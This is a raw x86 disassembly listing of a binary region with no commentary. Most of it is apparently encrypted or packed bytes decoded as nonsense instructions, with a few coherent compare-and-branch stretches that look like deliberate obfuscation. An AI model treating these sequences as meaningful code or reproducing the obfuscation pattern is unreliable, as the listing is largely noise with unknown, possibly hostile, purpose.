  411997:	mov    DWORD PTR [ebp+0x9],ecx
  41199a:	pop    ss
  41199b:	sbb    cl,BYTE PTR [edi+0x13]
  41199e:	retf   
  41199f:	loope  0x411a20
  4119a1:	jbe    0x411a0f
  4119a3:	scas   al,BYTE PTR es:[edi]
  4119a4:	(bad)
  4119a7:	mov    esp,0xfcbe77e7
  4119ac:	popa   
  4119ad:	xchg   edi,eax
  4119ae:	adc    DWORD PTR [eax],0xd7ab6581
  4119b4:	adc    eax,0x558b2d97
  4119b9:	les    eax,FWORD PTR [ecx+0xf3af1]
  4119bf:	add    BYTE PTR [ebx],cl
  4119c1:	enter  0x98a1,0x25
  4119c5:	inc    edx
  4119c6:	add    BYTE PTR [ebx+0x1d880],cl
  4119cc:	add    BYTE PTR [ebx+0x65f68100],cl
  4119d2:	data16 add BYTE PTR [eax],al
  4119d5:	or     esi,edx
  4119d7:	add    ecx,0xef6a96a5
  4119dd:	cdq    
  4119de:	adc    esi,0xc8b6a000
  4119e4:	cmp    eax,ecx
  4119e6:	jne    0x4119f4
  4119ec:	cmp    edx,esi
  4119ee:	je     0x411f3d
  4119f4:	mov    eax,DWORD PTR [ebp-0x50]
  4119f7:	jmp    0x411c6c
  4119fc:	loope  0x4119a1
  4119fe:	lods   eax,DWORD PTR ds:[esi]
  4119ff:	aam    0xab
  411a01:	mov    edx,0xd9d49ae0
  411a06:	gs mov esp,0x7cb5c15a
  411a0c:	imul   BYTE PTR [esi+0x18]
  411a0f:	sbb    BYTE PTR [ecx+0x14],dh
  411a12:	sbb    BYTE PTR [eax],bl
  411a14:	jbe    0x4119d5
  411a16:	jl     0x4119f8
  411a18:	fisttp DWORD PTR [eax-0x5c48b4a0]
  411a1e:	mov    ah,0x7d
  411a20:	and    ah,BYTE PTR [ebx]
  411a22:	int3   
  411a23:	push   DWORD PTR [edx+0x38be2367]
  411a29:	sahf   
  411a2a:	xor    BYTE PTR [edi+0x4ee15744],ah
  411a30:	sub    cl,0x8b
  411a33:	loopne 0x411a7b
  411a35:	and    DWORD PTR [ebx+0x49],edx
  411a38:	imul   ebp,DWORD PTR ds:[ebx+0x6c],0x43e70b8b
  411a40:	pushf  
  411a41:	inc    edi
  411a42:	pop    DWORD PTR [eax-0x5085da14]
  411a48:	repz push ebp
  411a4a:	popa   
  411a4b:	inc    edi
  411a4c:	add    ch,BYTE PTR [edi+0xf40015]
  411a52:	hlt    
  411a53:	sahf   
  411a54:	stos   DWORD PTR es:[edi],eax
  411a55:	in     eax,dx
  411a56:	inc    eax
  411a57:	pushf  
  411a58:	mov    DWORD PTR ds:[ebp+0x78],ecx
  411a5c:	and    DWORD PTR [edi],ebx
  411a5e:	and    edx,esi
  411a60:	dec    esi
  411a61:	push   edi
  411a62:	test   al,0x7b
  411a64:	cdq    
  411a65:	retf   0x28c9
  411a68:	(bad)  
  411a69:	xchg   esi,eax
  411a6a:	pusha  
  411a6b:	sbb    BYTE PTR [esi-0x5af7c30a],ch
  411a71:	jmp    0x4fdb46c1
  411a76:	pusha  
  411a77:	rcr    DWORD PTR [eax],1
  411a79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a7a:	xor    DWORD PTR [ebx+0x4e],0x32bebe53
  411a81:	mov    al,ds:0xb13a6cd1
  411a86:	cmp    BYTE PTR [eax-0x53],0x4
  411a8a:	mov    eax,0x59eb3945
  411a8f:	mov    al,0x40
  411a91:	sar    BYTE PTR [ebx],cl
  411a93:	dec    eax
  411a94:	lds    ebp,FWORD PTR [eax]
  411a96:	retf   
  411a97:	imul   esi,edi,0xffffffb1
  411a9a:	xchg   edx,eax
  411a9b:	(bad)  
  411a9c:	into   
  411a9d:	hlt    
  411a9e:	xchg   ebx,eax
  411a9f:	ds aas 
  411aa1:	mov    dl,0x78
  411aa3:	cmp    esp,eax
  411aa5:	lea    esi,[edi+esi*1-0x82ff4df]
  411aac:	ret    
  411aad:	cmp    ecx,DWORD PTR [ecx-0x53656af6]
  411ab3:	xor    DWORD PTR [ebx+ebx*4+0x5e63c2b2],edi
  411aba:	popa   
  411abb:	mov    eax,0xcaa25612
  411ac0:	xchg   DWORD PTR [eax],esp
  411ac2:	cdq    
  411ac3:	adc    al,0xfa
  411ac5:	mov    ebp,0x6319abe3
  411aca:	xor    BYTE PTR [ebx-0x6719f6bf],ch
  411ad0:	pop    ecx
  411ad1:	(bad)  [eax+0x53]
  411ad4:	clc    
  411ad5:	inc    DWORD PTR [ecx]
  411ad7:	push   cs
  411ad8:	inc    eax
  411ad9:	lds    edi,FWORD PTR ds:0x2a96b718
  411adf:	push   cs
  411ae0:	push   ds
  411ae1:	aam    0x5e
  411ae3:	cs pop eax
  411ae5:	(bad)
  411aea:	mov    DWORD PTR [esi],ebp
  411aec:	and    ah,BYTE PTR [edx]
  411aee:	mov    gs,WORD PTR [edi]
  411af0:	mov    ecx,0x624a4c7
  411af5:	rcl    BYTE PTR [ebx-0x44d74192],cl
  411afb:	pop    ds
  411afc:	mov    edi,0x3abbab8d
  411b01:	inc    esp
  411b02:	ss retf 
  411b04:	mov    ch,0x93
  411b06:	or     esi,edx
  411b08:	mov    eax,ds:0xcd71b552
  411b0d:	mov    dl,0x48
  411b0f:	and    eax,0x67327936
  411b14:	sar    BYTE PTR [ebp+0x4f],cl
  411b17:	xor    al,0x82
  411b19:	bound  edx,QWORD PTR [edi+0x554ca838]
  411b1f:	or     eax,0x83a27b9d
  411b24:	dec    ecx
  411b25:	lods   eax,DWORD PTR cs:[esi]
  411b27:	test   al,0x30
  411b29:	rcr    BYTE PTR [eax],1
  411b2b:	jae    0x411af1
  411b2d:	mov    dh,0xcd
  411b2f:	loope  0x411b53
  411b31:	les    eax,FWORD PTR [ecx-0x1f]
  411b34:	jmp    0x411b22
  411b36:	mov    fs,WORD PTR [ecx]
  411b38:	dec    eax
  411b39:	into   
  411b3a:	icebp  
  411b3b:	ret    
  411b3c:	cmp    al,BYTE PTR [edi+0x71]
  411b3f:	or     al,BYTE PTR [esi+0x47]
  411b42:	or     BYTE PTR [esi],dl
  411b44:	aam    0x78
  411b46:	aam    0x5f
  411b48:	xchg   ebx,eax
  411b49:	adc    BYTE PTR [edx+0x18cd6bbe],0x9c
  411b50:	push   ss
  411b51:	sbb    eax,0x6701f61e
  411b56:	test   eax,0x2960b4ea
  411b5b:	in     al,dx
  411b5c:	inc    esp
  411b5d:	outs   dx,BYTE PTR ds:[esi]
  411b5e:	jbe    0x411b92
  411b60:	pusha  
  411b61:	inc    ecx
  411b62:	cmp    al,0xc5
  411b64:	pop    esp
  411b65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b66:	mov    ebx,DWORD PTR [esi-0x3f]
  411b69:	or     al,0xf1
  411b6b:	fstp   DWORD PTR [edx]
  411b6d:	mov    dl,0x75
  411b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b70:	pushf  
  411b71:	inc    ebp
  411b72:	and    ebx,ebx
  411b74:	sub    DWORD PTR [ebx+0x3d2ed4dc],ecx
  411b7a:	mov    bh,0x58
  411b7c:	stos   BYTE PTR es:[edi],al
  411b7d:	repnz outs dx,DWORD PTR ds:[esi]
  411b7f:	mul    DWORD PTR ds:0xff26c57b
  411b85:	adc    bh,al
  411b87:	push   ebx
  411b88:	pop    edi
  411b89:	in     al,dx
  411b8a:	fld    QWORD PTR [eax+0x31]
  411b8d:	lahf   
  411b8e:	push   esp
  411b8f:	aaa    
  411b90:	cmp    DWORD PTR [edx],edx
  411b92:	adc    DWORD PTR [ebp+0x150beb0e],ebp
  411b98:	add    ch,BYTE PTR [ebx+0x610a981d]
  411b9e:	jnp    0x411b66
  411ba0:	pushf  
  411ba1:	mov    eax,DWORD PTR [ecx+ebx*2+0x47ed3e0f]
  411ba8:	mov    WORD PTR [ecx+0x79923d87],gs
  411bae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411baf:	sub    eax,0xed6e84cf
  411bb4:	add    BYTE PTR [ebp-0x63],0xbb
  411bb8:	in     al,dx
  411bb9:	(bad)
  411bbe:	cmp    al,0xae
  411bc0:	cdq    
  411bc1:	dec    eax
  411bc2:	cmp    BYTE PTR [edx-0x13],al
  411bc5:	cs jp  0x411c04
  411bc8:	sbb    edi,DWORD PTR [edi]
  411bca:	(bad)  
  411bcb:	dec    edx
  411bcc:	nop
  411bcd:	leave  
  411bce:	ds jge 0x411bd4
  411bd1:	mov    ch,0xc
  411bd3:	or     al,0x52
  411bd5:	dec    esp
  411bd6:	fiadd  WORD PTR [ecx+0x18d6b6a9]
  411bdc:	add    ebp,DWORD PTR [edx+0x0]
  411bdf:	sub    BYTE PTR [ebp-0x26],ah
  411be2:	dec    ebx
  411be3:	sti    
  411be4:	sti    
  411be5:	push   esp
  411be6:	add    dl,cl
  411be8:	and    al,0x9a
  411bea:	dec    esp
  411beb:	js     0x411b7c
  411bed:	add    DWORD PTR [edi],0x29a48411
  411bf3:	xchg   ecx,edi
  411bf5:	pop    ds
  411bf6:	in     al,0xfd
  411bf8:	xor    eax,0x79131ccd
  411bfd:	push   esi
  411bfe:	mov    edi,0x4c76a41c
  411c03:	mov    eax,ds:0xd5c2e5b
  411c08:	pop    edx
  411c09:	enter  0x8512,0x7f
  411c0d:	loopne 0x411c0d
  411c0f:	outs   dx,DWORD PTR ds:[esi]
  411c10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c11:	popa   
  411c12:	ficomp DWORD PTR [ebp+0x2a6c0729]
  411c18:	inc    ecx
  411c19:	push   ebp
  411c1a:	pushf  
  411c1b:	jp     0x411bda
  411c1d:	adc    al,0x86
  411c1f:	jecxz  0x411c4e
  411c21:	in     al,0xe5
  411c23:	sbb    al,0x22
  411c25:	aad    0x25
  411c27:	and    edi,ebp
  411c29:	dec    edi
  411c2a:	jecxz  0x411ca8
  411c2c:	and    esp,DWORD PTR [ecx-0x703d424c]
  411c32:	adc    eax,0x5b3dde9f
  411c37:	push   ebx
  411c38:	inc    ecx
  411c39:	enter  0x3bff,0x19
  411c3d:	push   ebx
  411c3e:	mov    BYTE PTR [eax+0x63],ch
  411c41:	mov    ah,0x9d
  411c43:	lock repz in eax,dx
  411c46:	into   
  411c47:	lds    ebp,FWORD PTR [ecx]
  411c49:	mov    esi,0x3136dce
  411c4e:	lds    ebx,FWORD PTR [edx+0x4198cf0c]
  411c54:	outs   dx,BYTE PTR ds:[esi]
  411c55:	or     eax,0xed6f6576
  411c5a:	sbb    eax,0x49a7673b
  411c5f:	fwait
  411c60:	popa   
  411c61:	pop    es
  411c62:	mov    bh,0xbd
  411c64:	mov    eax,ds:0xf52a0cd4
  411c69:	pop    ebx
  411c6a:	loop   0x411c0f
  411c6c:	mov    ecx,DWORD PTR [ebp-0x4c]
  411c6f:	mov    edx,DWORD PTR [ebp-0x60]
  411c72:	mov    esi,DWORD PTR [ebp-0x5c]
  411c75:	add    eax,0x7818
  411c7a:	adc    ecx,0x87
  411c80:	or     eax,edx
  411c82:	mov    edx,DWORD PTR [ebp-0x70]
  411c85:	jmp    0x411efa
  411c8a:	pop    ebp
  411c8b:	and    DWORD PTR [esi],esi
  411c8d:	xor    bh,BYTE PTR ds:[esi]
  411c90:	pop    ebp
  411c91:	sbb    bh,BYTE PTR [edi+edi*8+0x62cc6a08]
  411c98:	pop    edi
  411c99:	jo     0x411cea
  411c9b:	push   0x18
  411c9d:	sbb    BYTE PTR [ecx+0x14],dh
  411ca0:	sbb    BYTE PTR [eax],bl
  411ca2:	scas   eax,DWORD PTR es:[edi]
  411ca3:	cmp    BYTE PTR [edi],dh
  411ca5:	cs mov es,ebx
  411ca8:	fucom  st(2)
  411caa:	add    al,0x4
  411cac:	enter  0xbd11,0xb0
  411cb0:	jnp    0x411d14
  411cb2:	jle    0x411c82
  411cb4:	ss leave 
  411cb6:	(bad)  
  411cb7:	xor    ebp,DWORD PTR [edi+0x17bbacc7]
  411cbd:	retf   
  411cbe:	outs   dx,DWORD PTR ds:[esi]
  411cbf:	int    0xdb
  411cc1:	bound  esi,QWORD PTR [eax+0x12e8c112]
  411cc7:	imul   eax,ecx,0xf60018e2
  411ccd:	fild   WORD PTR [ecx+0x45]
  411cd0:	bound  eax,QWORD PTR [ebx-0x10]
  411cd3:	jo     0x411cf5
  411cd5:	mov    eax,0xb24fbe3
  411cda:	pop    eax
  411cdb:	ins    DWORD PTR es:[edi],dx
  411cdc:	pop    edx
  411cdd:	adc    eax,0xd7bd8bc
  411ce2:	call   0x6051:0x85db626d
  411ce9:	jle    0x411c7e
  411ceb:	xor    eax,DWORD PTR [eax-0x3e]
  411cee:	mov    dl,0x42
  411cf0:	inc    esp
  411cf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cf2:	xchg   edi,eax
  411cf3:	in     eax,dx
  411cf4:	cld    
  411cf5:	dec    esi
  411cf6:	icebp  
  411cf7:	cmp    al,0x6e
  411cf9:	pop    esp
  411cfa:	mov    edi,0x2649d822
  411cff:	jmp    0x411c97
  411d01:	sub    cl,BYTE PTR [edi-0xe]
  411d04:	fist   WORD PTR [ebx+0x1e046990]
  411d0a:	iret   
  411d0b:	dec    esp
  411d0c:	mov    esp,0xd16d0ae4
  411d11:	xor    al,0x78
  411d13:	lods   eax,DWORD PTR ds:[esi]
  411d14:	xchg   BYTE PTR [eax+ebp*1+0x8],cl
  411d18:	in     eax,0x75
  411d1a:	loop   0x411d61
  411d1c:	push   esp
  411d1d:	mov    ch,0x5f
  411d1f:	mov    DWORD PTR [ebx+0x1b71fba],esp
  411d25:	stos   DWORD PTR es:[edi],eax
  411d26:	inc    edi
  411d27:	loopne 0x411d8b
  411d29:	ins    BYTE PTR es:[edi],dx
  411d2a:	xor    al,0x79
  411d2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d2d:	jae    0x411cd1
  411d2f:	mov    edi,0x3826b206
  411d34:	sbb    bl,bl
  411d36:	jmp    0x2e6b18dd
  411d3b:	imul   edi,DWORD PTR [edx],0x42
  411d3e:	mov    ch,0x9d
  411d40:	xlat   BYTE PTR ds:[ebx]
  411d41:	test   al,0x80
  411d43:	inc    ecx
  411d44:	mov    ch,0x27
  411d46:	(bad)  
  411d47:	(bad)  
  411d48:	imul   ecx,DWORD PTR [ebp+ecx*8-0x71087964],0x630ea355
  411d53:	add    ebp,DWORD PTR [edi]
  411d55:	push   eax
  411d56:	mov    dl,0x52
  411d58:	pop    ebx
  411d59:	sbb    al,bl
  411d5b:	test   al,0xf0
  411d5d:	hlt    
  411d5e:	dec    ebp
  411d5f:	imul   ebx,DWORD PTR [ebx-0x2e5c4fc0],0xffffff8d
  411d66:	(bad)  
  411d67:	xor    eax,0x70b4562b
  411d6c:	ins    DWORD PTR es:[edi],dx
  411d6d:	pop    esp
  411d6e:	aad    0x34
  411d70:	stos   DWORD PTR es:[edi],eax
  411d71:	pop    edx
  411d72:	(bad)  
  411d73:	gs popa 
  411d75:	iret   
  411d76:	ja     0x411d0c
  411d78:	xchg   edx,eax
  411d79:	xor    ebp,eax
  411d7b:	loopne 0x411db6
  411d7d:	icebp  
  411d7e:	mov    edx,0xee89f8b6
  411d83:	xchg   ecx,eax
  411d84:	dec    edx
  411d85:	repnz cmp DWORD PTR [edx-0x268fb2f],edi
  411d8c:	or     BYTE PTR [edi+0x303086d3],0x9f
  411d93:	dec    eax
  411d94:	call   0xa48d:0xde0e188f
  411d9b:	sub    eax,0x9178eda1
  411da0:	jb     0x411da4
  411da2:	push   es
  411da3:	or     al,0x22
  411da5:	pop    esp
  411da6:	lock fwait
  411da8:	inc    ebp
  411da9:	inc    esp
  411daa:	addr16 sub edi,edx
  411dad:	rcr    BYTE PTR [edi],0x21
  411db0:	jle    0x411db1
  411db2:	xor    eax,ebx
  411db4:	mov    ds:0xf65d16a,eax
  411db9:	mov    al,0x22
  411dbb:	out    0xcc,al
  411dbd:	call   0x9dd4a9b9
  411dc2:	aad    0xe6
  411dc4:	or     edi,esi
  411dc6:	push   esi
  411dc7:	lahf   
  411dc8:	and    ebx,DWORD PTR [ebx]
  411dca:	dec    ebp
  411dcb:	out    dx,eax
  411dcc:	hlt    
  411dcd:	jmp    0xcd62:0xe599e8f5
  411dd4:	xchg   esp,eax
  411dd5:	aas    
  411dd6:	add    DWORD PTR [edx+edx*2+0x594e10fc],edx
  411ddd:	push   es
  411dde:	fnsave [ecx+eiz*2]
  411de1:	imul   BYTE PTR fs:[edi-0x6cc6d2c9]
  411de8:	ret    0x56b1
  411deb:	loope  0x411e2a
  411ded:	mov    ebp,0xd8838104
  411df2:	sub    eax,0xb7b25692
  411df7:	iret   
  411df8:	or     al,0xcd
  411dfa:	mov    ecx,DWORD PTR [ebp-0x254bd785]
  411e00:	cmp    esi,DWORD PTR [eax+0x4fa6592]
  411e06:	xor    eax,0xbefcaa8
  411e0b:	push   cs
  411e0c:	ret    0x2418
  411e0f:	mov    ebp,0xb6223fee
  411e14:	ret    0x7390
  411e17:	dec    ebx
  411e19:	jmp    0x9b6b3b69
  411e1e:	repnz (bad) 
  411e20:	sbb    ch,BYTE PTR [edi]
  411e22:	mov    ebp,0x461445e6
  411e27:	in     eax,0x86
  411e29:	sub    cl,BYTE PTR [ebx+eiz*1+0x631a8a0d]
  411e30:	cwde   
  411e31:	lods   al,BYTE PTR ds:[esi]
  411e32:	pop    esp
  411e33:	and    edi,DWORD PTR [esi-0x129b4e31]
  411e39:	xor    BYTE PTR [ebp-0x3fd410e7],0xe3
  411e40:	ret    0xeae1
  411e43:	mov    ch,0x8e
  411e45:	add    ebp,edi
  411e47:	or     BYTE PTR [ecx+ecx*1],bl
  411e4a:	xchg   edx,eax
  411e4b:	pop    esp
  411e4c:	xor    al,0xb6
  411e4e:	not    dh
  411e50:	loop   0x411e11
  411e52:	adc    DWORD PTR [esi-0x51d8fb97],esi
  411e58:	pusha  
  411e59:	sar    bh,cl
  411e5b:	test   BYTE PTR [eax-0x758884d6],0xf
  411e62:	jmp    0xd79b5bf6
  411e67:	push   cs
  411e68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e69:	aas    
  411e6a:	xchg   DWORD PTR [ebp+ebp*1+0x6d0ca3fa],ecx
  411e71:	outs   dx,DWORD PTR ds:[esi]
  411e72:	mov    ebp,ebx
  411e74:	jae    0x411ee0
  411e76:	mov    dl,0x19
  411e78:	leave  
  411e79:	pushf  
  411e7a:	mov    ebx,0xe3b4cf46
  411e7f:	out    0xe,eax
  411e81:	cmc    
  411e82:	and    al,0x3f
  411e84:	jns    0x411e6e
  411e86:	imul   ebx,DWORD PTR [esp+ebx*1-0x3e],0x78f16beb
  411e8e:	sub    DWORD PTR [eax+0x5e],esp
  411e91:	scas   al,BYTE PTR es:[edi]
  411e92:	rcl    DWORD PTR [esi-0x778bd99e],0x45
  411e99:	fimul  DWORD PTR [esi+0x1]
  411e9c:	ds inc edi
  411e9e:	cwde   
  411e9f:	cwde   
  411ea0:	xor    cl,BYTE PTR [ebx]
  411ea2:	(bad)  
  411ea3:	push   ss
  411ea4:	sub    DWORD PTR [edx+0x6d],eax
  411ea7:	das    
  411ea8:	mov    ah,0x60
  411eaa:	add    ebx,DWORD PTR [eax+edx*8-0x41bf4b]
  411eb1:	or     esi,esp
  411eb3:	mov    dl,0xdd
  411eb5:	(bad)  [edx-0x32]
  411eb8:	test   al,0xd2
  411eba:	push   edi
  411ebb:	arpl   WORD PTR [edi-0x56],si
  411ebe:	rcr    DWORD PTR [edx+0x79],1
  411ec1:	and    ebx,DWORD PTR [ecx-0x65]
  411ec4:	sbb    DWORD PTR [esi+0x65],ecx
  411ec7:	out    dx,al
  411ec8:	xchg   ebx,eax
  411ec9:	jg     0x411eb7
  411ecb:	aaa    
  411ecc:	inc    ebx
  411ecd:	sti    
  411ece:	pop    esi
  411ecf:	not    DWORD PTR [ebx]
  411ed1:	test   BYTE PTR [edx+0x2b1b2b7f],bl
  411ed7:	dec    eax
  411ed8:	icebp  
  411ed9:	and    BYTE PTR [ebx-0x34],al
  411edc:	popf   
  411edd:	push   ebx
  411ede:	or     al,0xc5
  411ee0:	(bad)  
  411ee1:	gs push cs
  411ee3:	sub    DWORD PTR [ebx+0xc042530],0x54
  411eea:	cdq    
  411eeb:	rol    BYTE PTR [edx],0x4c
  411eee:	pop    edi
  411eef:	sub    esp,edx
  411ef1:	adc    esi,esi
  411ef3:	leave  
  411ef4:	mov    esp,0x53f6b056
  411ef9:	cmp    BYTE PTR [ebx],cl
  411efb:	into   
  411efc:	mov    esi,DWORD PTR [ebp-0x6c]
  411eff:	push   esi
  411f00:	push   edx
  411f01:	push   ecx
  411f02:	push   eax
  411f03:	call   0x416c20
  411f08:	mov    ecx,DWORD PTR [ebp-0x80]
  411f0b:	mov    esi,DWORD PTR [ebp-0x7c]
  411f0e:	and    eax,ecx
  411f10:	mov    ecx,DWORD PTR ds:0x422598
  411f16:	mov    ecx,DWORD PTR [ecx+0x1d0]
  411f1c:	mov    ecx,DWORD PTR [ecx]
  411f1e:	and    edx,esi
  411f20:	xor    eax,0x2b01
  411f25:	xor    edx,0x2021
  411f2b:	xor    esi,esi
  411f2d:	cmp    ecx,eax
  411f2f:	jne    0x4127da
  411f35:	cmp    esi,edx
  411f37:	jne    0x4127da
  411f3d:	mov    eax,DWORD PTR [ebp-0xa4]
  411f43:	mov    ecx,DWORD PTR [ebp-0xc]
  411f46:	add    eax,0x80ca
  411f4b:	or     eax,ecx
  411f4d:	mov    ecx,DWORD PTR ds:0x422634
  411f53:	or     eax,0x686
  411f58:	xor    eax,0x3eec
  411f5d:	lea    eax,[eax+ecx*1-0xc11b]
  411f64:	xor    DWORD PTR ds:0x42262c,eax
  411f6a:	mov    eax,DWORD PTR [ebp-0x64]
  411f6d:	and    eax,0x4dff
  411f72:	add    eax,DWORD PTR [ebp-0x14]
  411f75:	mov    ecx,DWORD PTR [ebp-0x94]
  411f7b:	xor    eax,0x676c
  411f80:	xor    edx,edx
  411f82:	div    ecx
  411f84:	mov    ecx,DWORD PTR [ebp-0x24]
  411f87:	mov    edx,DWORD PTR [ebp-0x74]
  411f8a:	xor    ecx,0x6e1e
  411f90:	imul   ecx,edx
  411f93:	mov    edx,DWORD PTR [ebp+0x8]
  411f96:	push   0x4
  411f98:	jmp    0x41220d
  411f9d:	mov    gs,WORD PTR [esp+ecx*4-0x7c]
  411fa1:	push   0x64
  411fa3:	jle    0x411fff
  411fa5:	inc    ebp
  411fa6:	inc    ecx
  411fa7:	jne    0x412025
  411fa9:	jne    0x411f91
  411fab:	inc    ecx
  411fac:	mov    esi,0x181866a6
  411fb1:	jno    0x411fc7
  411fb3:	sbb    BYTE PTR [eax],bl
  411fb5:	push   eax
  411fb6:	and    dh,BYTE PTR [eax+0x469594f6]
  411fbc:	imul   bl
  411fbe:	pushf  
  411fbf:	idiv   cl
  411fc1:	fstp   DWORD PTR [ebp+0x728ca6b6]
  411fc7:	sbb    DWORD PTR [eax],eax
  411fc9:	dec    eax
  411fca:	sub    BYTE PTR [edi-0x68],ch
  411fcd:	aam    0xd1
  411fcf:	mov    edx,0x9b1bc6f5
  411fd4:	adc    BYTE PTR [ecx],bl
  411fd6:	rcl    bl,cl
  411fd8:	rcr    DWORD PTR [ecx+0x3f634c64],0x59
  411fdf:	or     al,0x50
  411fe1:	ins    BYTE PTR es:[edi],dx
  411fe2:	clc    
  411fe3:	aad    0xcc
  411fe5:	loope  0x411fd4
  411fe7:	sub    al,0x97
  411fe9:	mov    ds:0x9806168,al
  411fee:	retf   
  411fef:	mov    dl,0x68
  411ff1:	loope  0x412014
  411ff3:	pop    edx
  411ff4:	dec    ebx
  411ff5:	inc    eax
  411ff6:	push   ds
  411ff7:	adc    DWORD PTR [di-0x40],ecx
  411ffb:	xchg   edx,eax
  411ffc:	js     0x41207d
  411ffe:	xchg   ebx,eax
  411fff:	inc    ebx
  412000:	pop    ebp
  412001:	and    eax,0x46e371e8
  412006:	inc    eax
  412007:	add    DWORD PTR [esi+0x6756caad],ecx
  41200d:	pop    esp
  41200e:	adc    ebp,DWORD PTR [esp+ecx*1-0x58]
  412012:	iret   
  412013:	sbb    al,0x49
  412015:	scas   eax,DWORD PTR es:[edi]
  412016:	fmulp  st(0),st
  412018:	test   BYTE PTR [eax-0x78],dl
  41201b:	out    dx,eax
  41201c:	sbb    eax,0x40403e20
  412021:	mov    eax,0x99ba991a
  412026:	or     al,0x61
  412028:	fld    TBYTE PTR [ebx-0x19]
  41202b:	add    ch,bl
  41202d:	loope  0x4120a5
  41202f:	scas   al,BYTE PTR es:[edi]
  412030:	pop    ebp
  412031:	jl     0x411fce
  412033:	or     al,0x13
  412035:	in     al,0x6c
  412037:	and    BYTE PTR [edi],bl
  412039:	out    dx,al
  41203a:	mov    esi,0x1a501cbf
  41203f:	xor    DWORD PTR [eax-0x60758d6b],0xffffffea
  412046:	pusha  
  412047:	ror    BYTE PTR [ecx],0x46
  41204a:	pop    edi
  41204b:	gs ret 
  41204d:	mul    BYTE PTR ds:0x3543e8d4
  412053:	aad    0x70
  412055:	lods   eax,DWORD PTR ds:[esi]
  412056:	mov    es,edx
  412058:	test   dl,cl
  41205a:	xor    DWORD PTR [edx-0x66],ebx
  41205d:	jno    0x4120b6
  41205f:	std    
  412060:	out    dx,al
  412061:	mov    ebp,0xea107e69
  412066:	push   ebx
  412067:	loop   0x4120b6
  412069:	inc    ecx
  41206a:	xchg   ecx,eax
  41206b:	xlat   BYTE PTR ds:[ebx]
  41206c:	cmp    eax,esp
  41206e:	cmp    ecx,eax
  412070:	mov    bl,0xbf
  412072:	add    BYTE PTR [esp+ebx*2+0x3d31602a],al
  412079:	sahf   
  41207a:	ret    0x5ee0
  41207d:	mov    ds:0x793aa39a,al
  412082:	inc    ebx
  412083:	pop    ebx
  412084:	loope  0x41207c
  412086:	push   eax
  412087:	mov    DWORD PTR [edx-0x4],ebp
  41208a:	mov    ebp,0xb33e46f7
  41208f:	aad    0x4c
  412091:	outs   dx,BYTE PTR ds:[esi]
  412092:	mov    WORD PTR [ebx*4+0x47b76a8c],ds
  412099:	inc    edx
  41209a:	cld    
  41209b:	sbb    al,0x87
  41209d:	add    BYTE PTR [eax+0x5f2b3331],ch
  4120a3:	cmp    eax,0x68cbb2b3
  4120a8:	int3   
  4120a9:	xchg   ecx,eax
  4120aa:	popf   
  4120ab:	dec    edx
  4120ac:	shl    BYTE PTR [ecx-0x742fbb86],1
  4120b2:	and    dh,dl
  4120b4:	pop    esp
  4120b5:	xchg   DWORD PTR [eax-0x60d160cc],ebp
  4120bb:	pushf  
  4120bc:	sahf   
  4120bd:	shl    BYTE PTR fs:[ebp+0x6efad856],1
  4120c4:	add    eax,0xc137d4b
  4120c9:	mov    al,0xb6
  4120cb:	dec    edi
  4120cc:	add    eax,0xbab7157a
  4120d1:	pop    eax
  4120d2:	mov    ebp,0xf27a07c8
  4120d7:	gs das 
  4120d9:	adc    edx,DWORD PTR ds:0x345e955b
  4120df:	int3   
  4120e0:	mov    al,0xfb
  4120e2:	add    al,0x99
  4120e4:	sbb    BYTE PTR [ebx],0x20
  4120e7:	cmp    bl,ah
  4120e9:	pushf  
  4120ea:	jecxz  0x4120e0
  4120ec:	mov    eax,ds:0x17502540
  4120f1:	mov    eax,ds:0x6194ca3d
  4120f6:	mov    dl,0x1e
  4120f8:	lock inc edx
  4120fa:	out    dx,eax
  4120fb:	ret    0x4871
  4120fe:	dec    ebp
  4120ff:	push   ecx
  412100:	(bad)  
  412101:	cld    
  412102:	push   edx
  412103:	mov    al,0x5a
  412105:	and    al,0xd0
  412107:	push   ds
  412108:	cmp    BYTE PTR ds:0xe9fa7e41,bl
  41210e:	lods   al,BYTE PTR ds:[esi]
  41210f:	pop    ss
  412110:	dec    edi
  412111:	shr    DWORD PTR [ecx+0xae8e8db],0xa3
  412118:	sahf   
  412119:	push   esp
  41211a:	(bad)  
  41211b:	and    al,0x59
  41211d:	mov    bl,bh
  41211f:	popf   
  412120:	or     eax,0xfe9373f2
  412125:	ins    BYTE PTR es:[edi],dx
  412126:	out    0xde,eax
  412128:	push   0x93856a00
  41212d:	dec    edi
  41212e:	ds hlt 
  412130:	loope  0x412168
  412132:	inc    esp
  412133:	(bad)  
  412134:	(bad)  
  412135:	ss aas 
  412137:	add    edi,DWORD PTR [eax-0x50]
  41213a:	aam    0x3f
  41213c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41213d:	pop    edx
  41213e:	xchg   ebx,eax
  41213f:	xchg   edi,edi
  412141:	fbstp  TBYTE PTR [esi-0x28]
  412144:	mov    ebx,0xa549c430
  412149:	xchg   ebx,eax
  41214a:	(bad)  
  41214b:	mov    cl,0x87
  41214d:	fidiv  DWORD PTR [edi]
  412150:	sbb    al,0x2a
  412152:	jne    0x41219f
  412154:	jb     0x41219c
  412156:	adc    al,0xb7
  412158:	dec    eax
  412159:	imul   ebp,DWORD PTR [ecx+ebp*2-0x357feb9a],0xa8c94a0b
  412164:	out    0x70,al
  412166:	mov    dh,0x2b
  412168:	jo     0x4121e9
  41216a:	or     DWORD PTR [edi],0xde458066
  412170:	sub    edx,esi
  412172:	jp     0x412121
  412174:	lods   eax,DWORD PTR ds:[esi]
  412175:	in     al,0xc6
  412177:	mov    al,0xdd
  412179:	das    
  41217a:	mov    edx,0x43fcf34c
  41217f:	xor    al,0xa1
  412181:	and    esp,edi
  412183:	xlat   BYTE PTR ds:[ebx]
  412184:	into   
  412185:	mov    ah,0xe8
  412187:	aaa    
  412188:	cmp    eax,ebx
  41218a:	(bad)  
  41218b:	dec    ebx
  41218c:	pop    ss
  41218d:	push   eax
  41218e:	inc    eax
  41218f:	sub    al,0x3a
  412191:	fldenv [edx-0x6812fe98]
